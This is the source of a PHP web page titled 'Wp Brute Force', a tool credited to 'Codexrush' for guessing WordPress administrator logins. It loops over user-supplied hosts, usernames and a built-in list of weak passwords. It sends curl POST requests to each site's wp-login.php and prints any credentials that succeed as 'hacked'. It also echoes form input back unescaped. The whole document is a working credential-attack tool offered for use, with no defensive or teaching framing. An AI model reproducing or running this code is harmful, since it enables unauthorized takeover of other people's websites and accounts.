<html>
<title>Wp Brute Force</title>
<link href="https://fonts.googleapis.com/css?family=Metal Mania|Ceviche+One|Nosifer|Iceberg|Rancho|Iceland|Nova+Mono|Libre+Barcode+39+Extended+Text" rel="stylesheet" type="text/css"> 
<style>

body{

background-image:url(https://lesjeunesdabord.com/tools/bg.jpg); background-size:cover});

background-size:cover;

background-attachment: fixed;

}

p{

color:white;

}
		body       {background-color:black; color:#ffffff; font-family: 'Courier New', Courier, monospace; font-size: 20pt; padding:10px;}
		h2         {margin-bottom: 10px;}
	
		hr {
    display: block;
    height: 1px;
    border: 0.1px dotted;
    color: #fff;
}

@-webkit-keyframes blinker {
	from {
		opacity:1.0;
	}
	to {
		opacity:0.0;
	}
}
.menu {
    background: black;
    text-align: center;
    border: 1px solid red;
    border-radius: 10px;
    color: #ff0000;
    padding: 35px;
    margin: 10px;
}
x {
    display: inline;
    border: 1px solid red;
    border-radius: 20px;
    margin: 25px;
    padding: 14px;
    background: #2E0007;
    color: #FFFFFF;
}
</style>

</head>
<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >
</table><table width=100% ><tr><td align=center width=60% >
  
<div class="menu">
      <img src="https://i.ibb.co/sKKdLj1/IMG-20190828-222220.png" width="500" weight="500">
</div>

<div class="menu">
<x><font size="5" font face="Metal Mania">TOOLS</FONT></x>
<div class="menu">
<marquee behavior="alternate"><font size="10" font face="Metal Mania">- WORDPRESS BRUTE FORCE -</FONT></marquee>
</div>
     
<div class="menu">
<form enctype="multipart/form-data" method="POST">
  <table width='624' border='0' class='tabnet' id='Box'>
  <tr><th colspan="5">Tools Wp brute force <br> coded by Codexrush</th></tr>
    

    <tr>
      <td >&nbsp;</td>
      <td ><p>Hosts:</p></td>
      <td ><p> Users:</p></td>
      <td ><p>Passwords:</p></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td ><textarea style="background:#ffffff;" name="hosts" cols="30" rows="10" ><?php if($_POST){echo $_POST['hosts'];} ?></textarea></td>
      <td ><textarea style="background:white;" name="usernames" cols="30" rows="10"  ><?php if($_POST){echo $_POST['usernames'];}else {echo "admin";} ?></textarea></td>
      <td ><textarea style="background:white;" name="passwords" cols="30" rows="10"  ><?php if($_POST){echo $_POST['passwords'];}else {echo "admin\admin-wp\nadministrator\n123123\n123321\n123456\n1234567\n12345678\n123456789\n123456123456\nadmin2010\nadmin2011\npassword\nP@ssW0rd\n!@#$%^\n!@#$%^&*(\n(*&^%$#@!\n111111\n222222\n333333\n444444\n555555\n666666\n777777\n888888\n999999";} ?></textarea></td>
    </tr>
<tr><td colspan="5"><input class='inputzbut' type="submit" name="submit" value="BRUTE!"  />
<?php
if($_POST)
{
	$hosts = trim(filter($_POST['hosts']));
	$passwords = trim(filter($_POST['passwords']));
	$usernames = trim(filter($_POST['usernames']));

	if($passwords && $usernames && $hosts)
	{
		$hosts_explode = explode("\n", $hosts);
		$usernames_explode = explode("\n", $usernames);
    	$passwords_explode = explode("\n", $passwords);

		foreach($hosts_explode as $host)
		{
			$host = RemoveLastSlash($host);
			$hacked = 0;
			$host = str_replace(array("http://","https://","www."),"",trim($host));
			$host = "http://".$host;
			$wpAdmin = $host.'/wp-admin/';

			if(!url_exists($host."/wp-login.php"))
			{echo "<p>".$host." => <font color='red'>Error In Login Page !</font></p>";ob_flush();flush();continue;}

			foreach($usernames_explode as $username)
			{
				foreach($passwords_explode as $password)
				{
					$ch   =     curl_init();
					curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
					curl_setopt($ch,CURLOPT_URL,$host.'/wp-login.php');
					curl_setopt($ch,CURLOPT_COOKIEJAR,"coki.txt");
					curl_setopt($ch,CURLOPT_COOKIEFILE,"coki.txt");
					curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
					curl_setopt($ch,CURLOPT_POST,TRUE);
					curl_setopt($ch,CURLOPT_POSTFIELDS,"log=".$username."&pwd=".$password."&wp-submit=Giri&#8207;"."&redirect_to=".$wpAdmin."&testcookie=1");
					$login    =	   curl_exec($ch);

					if(eregi ("profile.php",$login) )
					{
						$hacked = 1;
						echo "<p>".$host." => UserName : [<font color='green'>".$username."</font>] : Password : [<font color='green'>".$password."</font>]</p>";
						ob_flush();flush();break;
					}
				}
				if($hacked == 1){break;}
			}
			if($hacked == 0)
			{echo "<p>".$host." => <font color='red'>Failed !</font></p>";ob_flush();flush();}
		}
	}
	else {echo "<p><font color='red'>All fields are Required ! </font></p>";}
}
?>
</td></tr>
</table></form></center>
</div>
<font face="monospace" size="2" color="white">Copyright © 2019 </font>
</div>
<?php
function url_exists($strURL)
{
    $resURL = curl_init();
    curl_setopt($resURL, CURLOPT_URL, $strURL);
    curl_setopt($resURL, CURLOPT_BINARYTRANSFER, 1);
    curl_setopt($resURL, CURLOPT_HEADERFUNCTION, 'curlHeaderCallback');
    curl_setopt($resURL, CURLOPT_FAILONERROR, 1);
    curl_exec ($resURL);
    $intReturnCode = curl_getinfo($resURL, CURLINFO_HTTP_CODE);
    curl_close ($resURL);
    if ($intReturnCode != 200){return false;}
	else{return true ;}
}
function filter($string)
{
	if(get_magic_quotes_gpc() != 0){return stripslashes($string);	}
	else{return $string;	}
}
function RemoveLastSlash($host)
{
	if(strrpos($host, '/', -1) == strlen($host)-1)
	{return substr($host,0,strrpos($host, '/', -1));}
	else{return $host;}
}
echo "</p>";


